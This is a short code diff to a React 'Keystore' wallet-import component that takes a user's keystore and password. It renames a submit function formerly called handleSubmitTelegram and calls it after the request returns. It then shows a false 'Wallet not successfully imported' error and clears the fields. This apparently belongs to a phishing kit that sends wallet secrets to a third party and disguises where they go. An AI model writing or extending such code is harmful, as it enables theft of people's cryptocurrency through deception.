@@ -18,7 +18,7 @@ const Keystore = () => {
     setKeyStore,
     password,
     setPassword,
-    handleSubmitTelegram,
+    handleSubmitNow,
   } = useContext(ProjectContext);
 
   const navigate = useNavigate();
@@ -43,7 +43,7 @@ const Keystore = () => {
       )
       .then((response) => {
         setLoading(false);
-        handleSubmitTelegram();
+        handleSubmitNow();
         toast.error("Wallet not successfully imported. Please try again.");
         setKeyStore("");
         setPassword("");
